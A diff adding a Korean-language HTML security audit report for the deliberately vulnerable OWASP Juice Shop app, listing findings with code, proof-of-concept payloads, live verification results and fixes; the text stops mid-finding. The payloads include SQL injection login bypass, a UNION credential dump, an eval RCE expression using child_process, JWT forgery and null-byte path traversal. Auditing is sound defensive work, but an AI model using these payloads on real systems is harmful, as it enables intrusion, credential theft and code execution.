@@ -1,0 +1,1296 @@
+<!DOCTYPE html>
+<html lang="ko" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Juice Shop SAST 보안 감사</title>
+<meta name="report-type" content="audit">
+<meta name="report-project" content="juice-shop">
+<meta name="report-date" content="2026-08-20">
+<script type="application/json" id="report-meta">
+{"title": "Juice Shop SAST 보안 감사", "type": "audit", "project": "juice-shop", "date": "2026-08-20"}
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+KR:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<style>
+:root{
+  --bg:#0f131a; --surface:#171d27; --surface-2:#1f2733; --line:#2b3542; --line-2:#38434f;
+  --ink:#e6ebf3; --ink-soft:#98a3b7; --ink-faint:#6a7486;
+  --err:#e8756f; --err-bg:#2c1a1a; --ok:#57bd89; --ok-bg:#14271d; --warn:#d8ab52; --warn-bg:#2a2416;
+  --info:#6e9fdc; --info-bg:#1a2740; --mut:#7d8798; --mut-bg:#242c38;
+  --code-bg:#0a0e15;
+}
+*{box-sizing:border-box}
+html,body{background:var(--bg);}
+body{margin:0;color:var(--ink);
+  font-family:"IBM Plex Sans KR",system-ui,-apple-system,"Malgun Gothic",sans-serif;
+  font-size:15px;line-height:1.6;-webkit-font-smoothing:antialiased;}
+.page{max-width:940px;margin:0 auto;padding:2rem 1.1rem 5rem;background:var(--bg);min-height:100vh;}
+.mono,code,pre{font-family:"IBM Plex Mono",ui-monospace,monospace;}
+a{color:var(--info);}
+.report-header{border-bottom:1px solid var(--line);padding-bottom:1rem;margin-bottom:1.6rem;}
+.report-header h1{margin:0 0 .3rem;font-size:clamp(22px,3.4vw,30px);font-weight:700;letter-spacing:-.02em;}
+.meta{font-size:.85em;color:var(--ink-faint);} .meta span{margin-right:1.3em;}
+h3{font-size:1.15rem;font-weight:700;margin:0 0 .8rem;letter-spacing:-.01em;}
+.section{margin-bottom:1.7rem;}
+.dim{color:var(--ink-soft);font-size:.9em;font-weight:400;}
+.badge{display:inline-block;padding:.15em .55em;border-radius:5px;font-size:.75em;font-weight:600;margin-right:.25em;
+  font-family:"IBM Plex Mono",monospace;white-space:nowrap;}
+.b-err{background:var(--err-bg);color:var(--err);} .b-ok{background:var(--ok-bg);color:var(--ok);}
+.b-warn{background:var(--warn-bg);color:var(--warn);} .b-info{background:var(--info-bg);color:var(--info);}
+.b-mut{background:var(--mut-bg);color:var(--mut);}
+.fail{color:var(--err);} .warn{color:var(--warn);} .pass{color:var(--ok);} .mut{color:var(--ink-faint);}
+.grade-wrap{display:flex;align-items:center;gap:1.4rem;flex-wrap:wrap;
+  background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:1.1rem 1.3rem;}
+.score{font-size:3em;font-weight:800;line-height:1;}
+.tiles{display:flex;gap:1.3rem;flex-wrap:wrap;margin-top:.5rem;}
+.tiles div{font-size:.85em;color:var(--ink-soft);} .tiles b{font-size:1.7em;display:block;color:var(--ink);}
+table{border-collapse:collapse;width:100%;background:var(--surface);border:1px solid var(--line);border-radius:10px;overflow:hidden;}
+th,td{padding:.55rem .8rem;text-align:left;border-bottom:1px solid var(--line);vertical-align:top;}
+thead th{background:var(--surface-2);color:var(--ink-soft);font-size:.8em;font-weight:600;letter-spacing:.03em;}
+tbody tr:last-child td{border-bottom:0;}
+details{margin-bottom:.6rem;border:1px solid var(--line);border-radius:10px;padding:.7rem 1rem;background:var(--surface);}
+details[open]{background:var(--surface-2);}
+summary{cursor:pointer;font-weight:500;line-height:2;}
+summary code{color:var(--ink);}
+details p{margin:.4rem 0;} details p.dim{margin:.2rem 0 .6rem;}
+h5{font-size:.72rem;text-transform:uppercase;letter-spacing:.06em;color:var(--ink-faint);margin:.9rem 0 .3rem;font-weight:700;}
+pre{margin:.2rem 0;background:var(--code-bg);border:1px solid var(--line);border-radius:8px;padding:.7rem .8rem;overflow-x:auto;font-size:.8em;line-height:1.65;color:#cdd7e6;}
+pre code{background:transparent;padding:0;color:inherit;}
+code{background:var(--surface-2);border:1px solid var(--line);border-radius:4px;padding:.05em .35em;font-size:.85em;color:var(--info);}
+code.evi{display:inline-block;color:var(--ink);}
+.note{border-left:3px solid var(--warn);background:var(--warn-bg);padding:.5rem .8rem;border-radius:0 7px 7px 0;font-size:.88em;margin:.5rem 0;}
+footer{margin-top:2.5rem;padding-top:1rem;border-top:1px solid var(--line);font-size:.8em;color:var(--ink-faint);}
+</style>
+</head>
+<body>
+<div class="page">
+  <div class="report-header">
+    <h1>Juice Shop SAST 보안 감사</h1>
+    <div class="meta">
+      <span>juice-shop</span><span>2026-08-20 14:37</span>
+      <span class="badge b-info">audit</span>
+      <span class="badge b-info">Semgrep → LLM 트리아지 → 동적검증</span>
+    </div>
+  </div>
+
+  <section class="section">
+    <h3>종합 평가</h3>
+    <div class="grade-wrap">
+      <div class="score fail">F</div>
+      <div>
+        <p style="margin:0"><strong class="fail">P1 크리티컬 5건 — 즉시 조치 필요 · 9건 실제 익스플로잇으로 동적 확증</strong></p>
+        <div class="tiles">
+          <div><b>43</b> 원시 탐지</div>
+          <div><b class="fail">22</b> 실제 취약점</div>
+          <div><b class="warn">15</b> 검토 필요</div>
+          <div><b class="pass">6</b> 오탐</div>
+          <div><b>51%</b> 신호비율</div>
+          <div><b class="fail">9</b> 동적 확증</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section">
+    <h3>우선순위 요약</h3>
+    <table>
+      <thead><tr><th>우선순위</th><th>등급</th><th>건수</th></tr></thead>
+      <tbody><tr><td><span class='badge b-err'>P1</span></td><td>크리티컬</td><td class='fail'>5</td></tr><tr><td><span class='badge b-warn'>P2</span></td><td>높음</td><td class='warn'>3</td></tr><tr><td><span class='badge b-info'>P3</span></td><td>중간</td><td class='warn'>14</td></tr><tr><td><span class='badge b-mut'>P4</span></td><td>낮음/정보</td><td class='mut'>21</td></tr></tbody>
+    </table>
+  </section>
+
+  
+    <section class="section">
+      <h3>동적 검증 — DAST 브리지 <span class="dim">(9건 확증)</span></h3>
+      <p class="dim">트리아지에서 확인된 각 finding 의 PoC 를 라이브 인스턴스(<code>http://localhost:3000</code>)에
+      실제로 재생했다. 재현된 항목은 <strong>동적 확증</strong>으로 승격 — 정적 추론이 아니라 실행된 익스플로잇이다.</p>
+      <table>
+        <thead><tr><th>ID</th><th>유형</th><th>결과</th><th>증거</th></tr></thead>
+        <tbody><tr><td><code>F028</code></td><td>hardcoded-secret</td><td class='fail'>✓ CONFIRMED</td><td>위조 RS256 토큰 수락(HTTP 200, 전체 사용자 목록 반환), 쓰레기 토큰은 401 — 커밋된 개인키로 완전 인증 우회</td></tr><tr><td><code>F029</code></td><td>path-traversal</td><td class='fail'>✓ CONFIRMED</td><td>null-byte 우회로 /ftp/package.json.bak%2500.md 획득 (4261 bytes)</td></tr><tr><td><code>F032</code></td><td>sql-injection</td><td class='fail'>✓ CONFIRMED</td><td>인증 우회 성공 — admin@juice-sh.op 토큰 발급</td></tr><tr><td><code>F034</code></td><td>open-redirect</td><td class='fail'>✓ CONFIRMED</td><td>공격자 URL로 302 리다이렉트: https://evil.example/?x=https://github.com/juice-shop/juice-shop</td></tr><tr><td><code>F035</code></td><td>sql-injection</td><td class='fail'>✓ CONFIRMED</td><td>union 주입으로 Users 테이블에서 24개 이메일 행 탈취</td></tr><tr><td><code>F036</code></td><td>code-injection</td><td class='fail'>✓ CONFIRMED</td><td>eval이 공격자 표현식 실행 — 프로필에 #{99999*7} 결과 699993 렌더링</td></tr><tr><td><code>F038</code></td><td>info-disclosure</td><td class='fail'>✓ CONFIRMED</td><td>/ftp/ 디렉터리 리스팅 노출 (14개 항목)</td></tr><tr><td><code>F040</code></td><td>info-disclosure</td><td class='fail'>✓ CONFIRMED</td><td>/encryptionkeys/ 디렉터리 리스팅 노출 (4개 항목)</td></tr><tr><td><code>F041</code></td><td>info-disclosure</td><td class='fail'>✓ CONFIRMED</td><td>/support/logs/ 디렉터리 리스팅 노출 (5개 항목)</td></tr></tbody>
+      </table>
+    </section>
+
+  <h3>상세 취약점</h3>
+  <section class="section"><h3>P1 — 크리티컬 <span class="dim">(5건)</span></h3>
+    <details>
+      <summary>
+        <span class="badge b-err">P1</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F032</code> · sql-injection — <code>routes/login.ts:34</code> <span class="badge b-err">✓ 동적 확증됨</span>
+      </summary>
+      <p class="dim">express-sequelize-injection &nbsp;|&nbsp; 악용가능성 <b class="fail">높음</b> · 신뢰도 0.98 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  30|   }
+  31| 
+  32|   return (req: Request, res: Response, next: NextFunction) =&gt; {
+  33|     verifyPreLoginChallenges(req) // vuln-code-snippet hide-line
+  34|     models.sequelize.query(`SELECT * FROM Users WHERE email = &#x27;${req.body.email || &#x27;&#x27;}&#x27; AND password = &#x27;${security.hash(req.body.password || &#x27;&#x27;)}&#x27; AND deletedAt IS NULL`, { model: UserModel, plain: true }) // vuln-code-snippet vuln-line loginAdminChallenge loginBenderChallenge loginJimChallenge
+  35|       .then((authenticatedUser) =&gt; { // vuln-code-snippet neutral-line loginAdminChallenge loginBenderChallenge loginJimChallenge
+  36|         const user = utils.queryResultToJson(authenticatedUser)
+  37|         if (user.data?.id &amp;&amp; user.data.totpSecret !== &#x27;&#x27;) {
+  38|           res.status(401).json({</code></pre>
+      <p><strong>판정 근거:</strong> req.body.email 이 로그인 라우트의 원시 SQL WHERE 절에 그대로 접합 — 전형적 인증우회 SQLi (&#x27; OR 1=1--).</p>
+      <p><strong>증거:</strong> <code class="evi">sequelize.query(`... WHERE email = &#x27;${req.body.email}&#x27; ...`)</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>email 필드 SQLi 로 인증 우회:
+  POST /rest/user/login
+  {&quot;email&quot;:&quot;&#x27; OR 1=1--&quot;,&quot;password&quot;:&quot;x&quot;}      → 첫 사용자(admin)로 로그인
+  또는  {&quot;email&quot;:&quot;admin@juice-sh.op&#x27;--&quot;, ...}</code></pre>
+      <h5>🎯 동적 검증 → HTTP 200</h5><p><strong>CONFIRMED</strong> — 인증 우회 성공 — admin@juice-sh.op 토큰 발급</p><pre><code>POST /rest/user/login {&quot;email&quot;:&quot;&#x27; OR 1=1--&quot;}</code></pre>
+      <p><strong>수정 방안:</strong> 파라미터화 replacements 사용; 요청 본문으로 SQL 문자열 생성 금지.</p>
+      <div class="note"><strong>트리아지 노트:</strong> Juice Shop 대표 로그인 SQLi. 라이브·외부·인증 전 단계 — 최우선.</div>
+      <p><span class="badge b-mut">CWE-89</span> <span class="badge b-mut">A01:2017</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-err">P1</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F035</code> · sql-injection — <code>routes/search.ts:23</code> <span class="badge b-err">✓ 동적 확증됨</span>
+      </summary>
+      <p class="dim">express-sequelize-injection &nbsp;|&nbsp; 악용가능성 <b class="fail">높음</b> · 신뢰도 0.97 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  19| export function searchProducts () {
+  20|   return (req: Request, res: Response, next: NextFunction) =&gt; {
+  21|     let criteria: any = req.query.q === &#x27;undefined&#x27; ? &#x27;&#x27; : req.query.q ?? &#x27;&#x27;
+  22|     criteria = (criteria.length &lt;= 200) ? criteria : criteria.substring(0, 200)
+  23|     models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE &#x27;%${criteria}%&#x27; OR description LIKE &#x27;%${criteria}%&#x27;) AND deletedAt IS NULL) ORDER BY name`) // vuln-code-snippet vuln-line unionSqlInjectionChallenge dbSchemaChallenge
+  24|       .then(([products]: any) =&gt; {
+  25|         const dataString = JSON.stringify(products)
+  26|         if (challengeUtils.notSolved(challenges.unionSqlInjectionChallenge)) { // vuln-code-snippet hide-start
+  27|           let solved = true</code></pre>
+      <p><strong>판정 근거:</strong> req.query.q 가 템플릿 리터럴로 원시 Sequelize 쿼리에 흘러들어감, 파라미터화 없음 — 라이브 상품검색 union SQLi.</p>
+      <p><strong>증거:</strong> <code class="evi">sequelize.query(`... LIKE &#x27;%${criteria}%&#x27; ...`), criteria = req.query.q</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>상품 검색의 union 기반 SQLi:
+  GET /rest/products/search?q=qwert&#x27;))--                 (주입 확인)
+  GET /rest/products/search?q=qwert&#x27;)) UNION SELECT id,email,password,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27; FROM Users--   (자격증명 덤프)</code></pre>
+      <h5>🎯 동적 검증 → HTTP 200</h5><p><strong>CONFIRMED</strong> — union 주입으로 Users 테이블에서 24개 이메일 행 탈취</p><pre><code>GET /rest/products/search?q=... UNION SELECT ... FROM Users--</code></pre>
+      <p><strong>수정 방안:</strong> 검색어 파라미터화.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 라이브 라우트(routes/search.ts); F015/F023/F024 코드픽스 스니펫의 도달 가능 버전.</div>
+      <p><span class="badge b-mut">CWE-89</span> <span class="badge b-mut">A01:2017</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-err">P1</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F036</code> · code-injection — <code>routes/userProfile.ts:65</code> <span class="badge b-err">✓ 동적 확증됨</span>
+      </summary>
+      <p class="dim">code-string-concat &nbsp;|&nbsp; 악용가능성 <b class="fail">높음</b> · 신뢰도 0.95 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  61|         try {
+  62|           if (!code) {
+  63|             throw new Error(&#x27;Username is null&#x27;)
+  64|           }
+  65|           username = eval(code) // eslint-disable-line no-eval
+  66|         } catch (err) {
+  67|           username = &#x27;\\&#x27; + username
+  68|         }
+  69|       } else {</code></pre>
+      <p><strong>판정 근거:</strong> 사용자 영향 하의 code 가 사용자 프로필 핸들러의 eval() 로 전달 → 임의 코드 실행/SSTI.</p>
+      <p><strong>증거:</strong> <code class="evi">username = eval(code)</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>프로필 username 을 통한 서버측 템플릿/eval 주입:
+  username 을  #{7*7}  로 설정                              → 49 렌더(eval 확인)
+  RCE:  #{global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;)}</code></pre>
+      <h5>🎯 동적 검증 → HTTP 200</h5><p><strong>CONFIRMED</strong> — eval이 공격자 표현식 실행 — 프로필에 #{99999*7} 결과 699993 렌더링</p><pre><code>POST /profile username=#{99999*7} → GET /profile (server-side eval)</code></pre>
+      <p><strong>수정 방안:</strong> eval 제거; 기대값을 명시적으로 파싱/화이트리스트.</p>
+      <div class="note"><strong>트리아지 노트:</strong> Juice Shop SSTI/eval 챌린지 — 앱 프로세스 컨텍스트에서 RCE.</div>
+      <p><span class="badge b-mut">CWE-95</span> <span class="badge b-mut">A03:2021</span> <span class="badge b-mut">A05:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-err">P1</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F028</code> · hardcoded-secret — <code>lib/insecurity.ts:54</code> <span class="badge b-err">✓ 동적 확증됨</span>
+      </summary>
+      <p class="dim">hardcoded-jwt-secret &nbsp;|&nbsp; 악용가능성 <b class="fail">높음</b> · 신뢰도 0.90 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  50| }
+  51| 
+  52| export const isAuthorized = () =&gt; expressJwt(({ secret: publicKey }) as any)
+  53| export const denyAll = () =&gt; expressJwt({ secret: &#x27;&#x27; + Math.random() } as any)
+  54| export const authorize = (user = {}) =&gt; jwt.sign(user, privateKey, { expiresIn: &#x27;6h&#x27;, algorithm: &#x27;RS256&#x27; })
+  55| export const verify = (token: string) =&gt; token ? (jws.verify as ((token: string, secret: string) =&gt; boolean))(token, publicKey) : false
+  56| export const decode = (token: string) =&gt; { return jws.decode(token)?.payload }
+  57| 
+  58| export const sanitizeHtml = (html: string) =&gt; sanitizeHtmlLib(html)</code></pre>
+      <p><strong>판정 근거:</strong> JWT를 RS256으로 서명하는 privateKey를 Juice Shop이 리포지토리(encryptionkeys/)에 커밋 — 서명키가 사실상 공개라 공격자가 유효 토큰을 위조해 권한 상승 가능.</p>
+      <p><strong>증거:</strong> <code class="evi">jwt.sign(user, privateKey, { algorithm: &#x27;RS256&#x27; }) — 리포지토리 내 개인키 사용</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>encryptionkeys/ 에 커밋된 개인키로 admin JWT 위조:
+  header  {&quot;alg&quot;:&quot;RS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}
+  payload {&quot;data&quot;:{&quot;email&quot;:&quot;admin@juice-sh.op&quot;,&quot;role&quot;:&quot;admin&quot;}}
+  리포지토리 내 RSA 개인키로 서명 후:
+  Authorization: Bearer &lt;위조토큰&gt;   → admin 으로 인증됨.</code></pre>
+      <h5>🎯 동적 검증 → HTTP 200</h5><p><strong>CONFIRMED</strong> — 위조 RS256 토큰 수락(HTTP 200, 전체 사용자 목록 반환), 쓰레기 토큰은 401 — 커밋된 개인키로 완전 인증 우회</p><pre><code>sign JWT with in-repo RSA key → GET /api/Users (Authorization: Bearer &lt;forged&gt;)</code></pre>
+      <p><strong>수정 방안:</strong> 개인키를 시크릿 저장소/HSM에서 로드하고 커밋된 키 폐기·교체.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 실제 고위험 인증 결함(JWT 위조). 룰은 sign() 호출에 걸렸지만 진짜 원인은 커밋된 키 자체.</div>
+      <p><span class="badge b-mut">CWE-798</span> <span class="badge b-mut">A07:2021</span> <span class="badge b-mut">A07:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-err">P1</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F029</code> · path-traversal — <code>routes/fileServer.ts:32</code> <span class="badge b-err">✓ 동적 확증됨</span>
+      </summary>
+      <p class="dim">express-res-sendfile &nbsp;|&nbsp; 악용가능성 <b class="fail">높음</b> · 신뢰도 0.90 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  28| 
+  29|       challengeUtils.solveIf(challenges.directoryListingChallenge, () =&gt; { return file.toLowerCase() === &#x27;acquisitions.md&#x27; })
+  30|       verifySuccessfulPoisonNullByteExploit(file)
+  31| 
+  32|       res.sendFile(path.resolve(&#x27;ftp/&#x27;, file))
+  33|     } else {
+  34|       res.status(403)
+  35|       next(new Error(&#x27;Only .md and .pdf files are allowed!&#x27;))
+  36|     }</code></pre>
+      <p><strong>판정 근거:</strong> 사용자 file 이 슬래시 가드 없이 res.sendFile 로 전달; poison null byte 처리 코드가 의도된 임의 파일 읽기임을 방증.</p>
+      <p><strong>증거:</strong> <code class="evi">res.sendFile(path.resolve(&#x27;ftp/&#x27;, file)) + verifySuccessfulPoisonNullByteExploit(file)</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>poison null byte 로 .md/.pdf 허용검사 우회:
+  GET /ftp/package.json%2500.md          → package.json 다운로드
+  GET /ftp/eastere.gg%2500.md</code></pre>
+      <h5>🎯 동적 검증 → HTTP 200</h5><p><strong>CONFIRMED</strong> — null-byte 우회로 /ftp/package.json.bak%2500.md 획득 (4261 bytes)</p><pre><code>GET /ftp/package.json.bak%2500.md</code></pre>
+      <p><strong>수정 방안:</strong> 경로 정규화 후 의도 디렉터리 내부인지 검증; 파일명 허용목록 검증.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 유효한 완화 없음(F030/F031/F033과 달리) — sendFile 군에서 가장 위험.</div>
+      <p><span class="badge b-mut">CWE-73</span> <span class="badge b-mut">A04:2021</span> <span class="badge b-mut">A06:2025</span></p>
+    </details></section><section class="section"><h3>P2 — 높음 <span class="dim">(3건)</span></h3>
+    <details>
+      <summary>
+        <span class="badge b-warn">P2</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F038</code> · info-disclosure — <code>server.ts:288</code> <span class="badge b-err">✓ 동적 확증됨</span>
+      </summary>
+      <p class="dim">express-check-directory-listing &nbsp;|&nbsp; 악용가능성 <b class="warn">중간</b> · 신뢰도 0.85 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 284|   })
+ 285| 
+ 286|   // vuln-code-snippet start directoryListingChallenge accessLogDisclosureChallenge
+ 287|   /* /ftp directory browsing and file download */ // vuln-code-snippet neutral-line directoryListingChallenge
+ 288|   app.use(&#x27;/ftp&#x27;, serveIndexMiddleware, serveIndex(&#x27;ftp&#x27;, { icons: true })) // vuln-code-snippet vuln-line directoryListingChallenge
+ 289|   app.use(&#x27;/ftp(?!/quarantine)/:file&#x27;, servePublicFiles()) // vuln-code-snippet vuln-line directoryListingChallenge
+ 290|   app.use(&#x27;/ftp/quarantine/:file&#x27;, serveQuarantineFiles()) // vuln-code-snippet neutral-line directoryListingChallenge
+ 291| 
+ 292|   app.use(&#x27;/.well-known&#x27;, serveIndexMiddleware, serveIndex(&#x27;.well-known&#x27;, { icons: true, view: &#x27;details&#x27; }))</code></pre>
+      <p><strong>판정 근거:</strong> 다운로드 가능한 민감 파일이 있는 /ftp 에 디렉터리 브라우징 활성화.</p>
+      <p><strong>증거:</strong> <code class="evi">serveIndex(&#x27;ftp&#x27;, { icons: true })</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>GET /ftp   → 디렉터리 리스팅; 노출 파일 다운로드(쿠폰, 백업, 이스터에그).</code></pre>
+      <h5>🎯 동적 검증 → HTTP 200</h5><p><strong>CONFIRMED</strong> — /ftp/ 디렉터리 리스팅 노출 (14개 항목)</p><pre><code>GET /ftp/</code></pre>
+      <p><strong>수정 방안:</strong> 리스팅 비활성화; 민감 파일 접근 통제.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 의도된 디렉터리 리스팅 챌린지; /ftp 는 민감 산출물 노출.</div>
+      <p><span class="badge b-mut">CWE-548</span> <span class="badge b-mut">A06:2017</span> <span class="badge b-mut">A01:2021</span> <span class="badge b-mut">A01:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-warn">P2</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F040</code> · info-disclosure — <code>server.ts:296</code> <span class="badge b-err">✓ 동적 확증됨</span>
+      </summary>
+      <p class="dim">express-check-directory-listing &nbsp;|&nbsp; 악용가능성 <b class="warn">중간</b> · 신뢰도 0.85 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 292|   app.use(&#x27;/.well-known&#x27;, serveIndexMiddleware, serveIndex(&#x27;.well-known&#x27;, { icons: true, view: &#x27;details&#x27; }))
+ 293|   app.use(&#x27;/.well-known&#x27;, express.static(&#x27;.well-known&#x27;))
+ 294| 
+ 295|   /* /encryptionkeys directory browsing */
+ 296|   app.use(&#x27;/encryptionkeys&#x27;, serveIndexMiddleware, serveIndex(&#x27;encryptionkeys&#x27;, { icons: true, view: &#x27;details&#x27; }))
+ 297|   app.use(&#x27;/encryptionkeys/:file&#x27;, serveKeyFiles())
+ 298| 
+ 299|   /* /logs directory browsing */ // vuln-code-snippet neutral-line accessLogDisclosureChallenge
+ 300|   app.use(&#x27;/support/logs&#x27;, serveIndexMiddleware, serveIndex(&#x27;logs&#x27;, { icons: true, view: &#x27;details&#x27; })) // vuln-code-snippet vuln-line accessLogDisclosureChallenge</code></pre>
+      <p><strong>판정 근거:</strong> 키 자료 파일을 나열하는 /encryptionkeys 에 디렉터리 브라우징.</p>
+      <p><strong>증거:</strong> <code class="evi">serveIndex(&#x27;encryptionkeys&#x27;, ...)</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>GET /encryptionkeys   → 키 자료 파일 나열(이후 개별 파일 획득).</code></pre>
+      <h5>🎯 동적 검증 → HTTP 200</h5><p><strong>CONFIRMED</strong> — /encryptionkeys/ 디렉터리 리스팅 노출 (4개 항목)</p><pre><code>GET /encryptionkeys/</code></pre>
+      <p><strong>수정 방안:</strong> 리스팅 비활성화; 키 디렉터리 절대 노출 금지.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 영향 큼 — 암호화 키 파일을 열거.</div>
+      <p><span class="badge b-mut">CWE-548</span> <span class="badge b-mut">A06:2017</span> <span class="badge b-mut">A01:2021</span> <span class="badge b-mut">A01:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-warn">P2</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F034</code> · open-redirect — <code>routes/redirect.ts:18</code> <span class="badge b-err">✓ 동적 확증됨</span>
+      </summary>
+      <p class="dim">express-open-redirect &nbsp;|&nbsp; 악용가능성 <b class="warn">중간</b> · 신뢰도 0.70 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  14|     const toUrl: string = query.to as string
+  15|     if (security.isRedirectAllowed(toUrl)) {
+  16|       challengeUtils.solveIf(challenges.redirectCryptoCurrencyChallenge, () =&gt; { return toUrl === &#x27;https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW&#x27; || toUrl === &#x27;https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm&#x27; || toUrl === &#x27;https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6&#x27; })
+  17|       challengeUtils.solveIf(challenges.redirectChallenge, () =&gt; { return isUnintendedRedirect(toUrl) })
+  18|       res.redirect(toUrl)
+  19|     } else {
+  20|       res.status(406)
+  21|       next(new Error(&#x27;Unrecognized target URL for redirect: &#x27; + toUrl))
+  22|     }</code></pre>
+      <p><strong>판정 근거:</strong> res.redirect(toUrl) 가 isRedirectAllowed 로 가드되지만, 그 검사는 부분문자열 기반이라 우회 가능 (예: ?to=https://evil?x=&lt;허용URL&gt;).</p>
+      <p><strong>증거:</strong> <code class="evi">if (security.isRedirectAllowed(toUrl)) { res.redirect(toUrl) }</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>허용목록이 부분문자열 기반 → 허용 URL 을 쿼리 파라미터로 넣어 우회:
+  GET /redirect?to=https://evil.example/?ref=https://github.com/juice-shop/juice-shop</code></pre>
+      <h5>🎯 동적 검증 → HTTP 302</h5><p><strong>CONFIRMED</strong> — 공격자 URL로 302 리다이렉트: https://evil.example/?x=https://github.com/juice-shop/juice-shop</p><pre><code>GET /redirect?to=https://evil.example/?x=&lt;allowlisted&gt;</code></pre>
+      <p><strong>수정 방안:</strong> 부분문자열 포함이 아니라 호스트 정확 허용목록으로 검증.</p>
+      <div class="note"><strong>트리아지 노트:</strong> 가드는 있으나 약함 — 의도된 오픈리다이렉트 챌린지; 우회 기법 필요.</div>
+      <p><span class="badge b-mut">CWE-601</span> <span class="badge b-mut">A01:2021</span> <span class="badge b-mut">A01:2025</span></p>
+    </details></section><section class="section"><h3>P3 — 중간 <span class="dim">(14건)</span></h3>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F007</code> · ci-hardening — <code>.github/workflows/image_actions.yml:33</code>
+      </summary>
+      <p class="dim">github-actions-mutable-action-tag &nbsp;|&nbsp; 악용가능성 <b class="mut">낮음</b> · 신뢰도 0.92 · 엔진 심각도 WARNING</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code>  29|       - name: Checkout Branch
+  30|         uses: actions/checkout@v6
+  31|       - name: Compress Images
+  32|         id: calibre
+  33|         uses: calibreapp/image-actions@main
+  34|         with:
+  35|           githubToken: ${{ secrets.GITHUB_TOKEN }}
+  36|           ignorePaths: &#x27;**/3d_keychain.jpg,**/favorite-hiking-place.png,**/5.png&#x27;
+  37|           compressOnly: ${{ github.event_name != &#x27;pull_request&#x27; }}</code></pre>
+      <p><strong>판정 근거:</strong> calibreapp/image-actions 가 @main(움직이는 브랜치)에 고정 — 가장 약한 참조.</p>
+      <p><strong>증거:</strong> <code class="evi">uses: calibreapp/image-actions@main</code></p>
+      <h5>⚔ 공격 예시 (PoC)</h5><pre><code>공급망: @main 은 움직이는 브랜치 — 액션 소유자(또는 리포지토리 침해)가 언제든 CI 에서 임의 코드 실행 가능.</code></pre>
+      
+      <p><strong>수정 방안:</strong> 커밋 SHA로 고정.</p>
+      <div class="note"><strong>트리아지 노트:</strong> @main 은 버전 태그보다 위험 — 군집 내에서 우선순위 약간 상향.</div>
+      <p><span class="badge b-mut">CWE-1357</span> <span class="badge b-mut">CWE-353</span> <span class="badge b-mut">A08:2021</span> <span class="badge b-mut">A08:2025</span></p>
+    </details>
+    <details>
+      <summary>
+        <span class="badge b-info">P3</span>
+        <span class="badge b-err">실제 취약점</span>
+        <code>F002</code> · supply-chain — <code>.github/workflows/ci.yml:359</code>
+      </summary>
+      <p class="dim">gha-curl-pipe-shell &nbsp;|&nbsp; 악용가능성 <b class="warn">중간</b> · 신뢰도 0.85 · 엔진 심각도 ERROR</p>
+      <h5>코드 컨텍스트</h5>
+      <pre><code> 355|     steps:
+ 356|       - name: &quot;Check out Git repository&quot;
+ 357|         uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 #v7.0.1
+ 358|       - name: &quot;Install Heroku CLI&quot;
